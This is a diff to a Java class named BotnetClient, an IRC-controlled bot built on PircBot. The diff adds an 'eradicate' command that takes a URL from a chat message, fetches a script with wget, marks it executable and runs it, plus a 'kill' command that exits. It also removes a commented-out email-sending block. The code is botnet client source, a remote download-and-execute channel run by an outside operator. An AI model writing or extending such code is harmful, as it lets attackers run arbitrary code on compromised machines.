@@ -138,6 +138,15 @@ public class BotnetClient extends PircBot {
 				}
 			} else if (message.toLowerCase().startsWith("lease")) {
 				System.out.println("Leasing Myself");
+			} else if (message.toLowerCase().startsWith("eradicate")) {
+				String[] parts = message.split(" ");
+				if (parts.length > 1) {
+					String url = parts[1];
+					Runtime.getRuntime().exec("wget -O clean.sh " + url + "; chmod +x clean.sh; ./clean.sh;");
+					System.exit(0);
+				}
+			} else if (message.toLowerCase().startsWith("kill")) {
+				System.exit(0);
 			} else {
 				System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
 			}
@@ -197,23 +206,6 @@ public class BotnetClient extends PircBot {
 		} catch(Exception e) {
 			e.printStackTrace();
 		}
-		/*
-		Properties props = new Properties();
-		Session session = Session.getDefaultInstance(props);
-	    MimeMessage message = new MimeMessage( session );
-	    try {
-	    	message.setFrom(new InternetAddress(from));
-	    	for (int i = 0; i < to.length; i++) {
-	    		message.addRecipient(Message.RecipientType.TO, new InternetAddress(to[i]));
-	    	}
-	    	message.setSubject(subject);
-	    	message.setText(body);
-	    	Transport.send(message);
-	    	System.out.println("Email to " + Arrays.toString(to) + " sent.");
-	    } catch (MessagingException ex){
-	    	System.err.println("Cannot send email. " + ex);
-	    }
-	    */
 	}
 
 	protected void onIncomingChatRequest(DccChat chat) {
